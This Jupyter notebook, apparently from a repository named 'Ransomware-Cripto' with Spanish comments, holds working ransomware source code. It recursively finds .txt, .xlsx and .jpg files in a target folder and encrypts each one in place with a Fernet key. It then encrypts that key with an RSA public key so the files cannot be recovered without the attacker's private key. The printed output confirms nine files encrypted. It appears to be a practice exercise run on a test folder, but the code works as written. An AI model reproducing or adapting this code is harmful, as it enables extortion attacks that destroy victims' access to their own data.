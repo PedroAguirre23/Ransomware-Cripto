{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import string\n",
    "import rsa\n",
    "\n",
    "from cryptography.fernet import Fernet\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'.jpg', '.xlsx', '.txt'}\n"
     ]
    }
   ],
   "source": [
    "encrypted_ext = set(('.txt', '.xlsx', '.jpg'))\n",
    "files_location = './Atacar'\n",
    "print(encrypted_ext)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Find Files\n",
    "target_file_paths = []\n",
    "for root, dirs, files in os.walk(files_location):\n",
    "    for file in files:\n",
    "        file_path, file_extension = os.path.splitext(root + '/' + file)\n",
    "        if file_extension in encrypted_ext:\n",
    "            target_file_paths.append(root + '/' + file)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Guarda la llave\n",
    "key = Fernet.generate_key()\n",
    "with open(\"llave.key\", 'wb') as f:\n",
    "    f.write(key)\n",
    "   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "encriptado: ./Atacar/archivo_foto.jpg\n",
      "encriptado: ./Atacar/excel_1.xlsx\n",
      "encriptado: ./Atacar/archivo_texto_1.txt\n",
      "encriptado: ./Atacar/archivo_texto_3.txt\n",
      "encriptado: ./Atacar/archivo_texto_2.txt\n",
      "encriptado: ./Atacar/carpeta_1/archivo_texto_en_carpeta1.txt\n",
      "encriptado: ./Atacar/carpeta_1/excel_en_carpeta1.xlsx\n",
      "encriptado: ./Atacar/carpeta_2/excel_en_carpeta2.xlsx\n",
      "encriptado: ./Atacar/carpeta_2/archivo_texto_en_carpeta2.txt\n"
     ]
    }
   ],
   "source": [
    "# encriptador\n",
    "\n",
    "file_path = target_file_paths[0]\n",
    "for file_path in target_file_paths:\n",
    "    with open(file_path, 'rb') as f:\n",
    "        data = f.read()\n",
    "        fernet = Fernet(key)\n",
    "        encrypted = fernet.encrypt(data)\n",
    "        #print(\"encrypted:\", encrypted)\n",
    "        with open(file_path, 'wb') as f:\n",
    "            f.write(encrypted)\n",
    "        print(\"encriptado:\", file_path)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Encriptador de llaves\n",
    "with open('./keys/pubKey.pem', mode='rb') as pk_file:\n",
    "    keydata = pk_file.read()\n",
    "    pubKey = rsa.PublicKey.load_pkcs1(keydata)\n",
    "    f= open(\"./llave.key\", 'rb')\n",
    "    fernet_key = f.read()\n",
    "    f.close()\n",
    "\n",
    "    encrypted_fernet_key = rsa.encrypt(fernet_key, pubKey)\n",
    "    \n",
    "    f = open(\"./llave.key\", 'wb')\n",
    "    f.write(bytearray(encrypted_fernet_key))\n",
    "    f.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "a0a5145e6c304e2a9afaf5b930a2955b950bd4b81fe94f7c42930f43f42762eb"
  },
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
